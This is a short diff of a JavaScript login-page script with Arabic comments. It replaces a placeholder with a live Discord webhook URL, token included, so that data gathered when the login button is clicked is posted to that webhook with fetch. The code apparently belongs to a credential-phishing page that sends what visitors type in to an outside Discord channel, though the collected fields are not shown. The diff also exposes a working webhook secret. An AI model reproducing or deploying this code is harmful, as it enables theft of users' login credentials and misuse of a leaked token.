@@ -11,7 +11,7 @@ document.getElementById('loginButton').addEventListener('click', function (e) {
   };
 
   // رابط Webhook الخاص بديسكورد
-  var webhookURL = "YOUR_DISCORD_WEBHOOK_URL"; // استبدله برابط الـ Webhook
+  var webhookURL = "https://discord.com/api/webhooks/1352734475494232134/YCIy1vfzG2SmZjtxCvMTwhQaf2DE29S7jv6iRdjqM8ocAeILWCLCT4loXBUKkFuqurwS"; // استبدله برابط الـ Webhook
 
   // إرسال البيانات عبر الـ Fetch API
   fetch(webhookURL, {
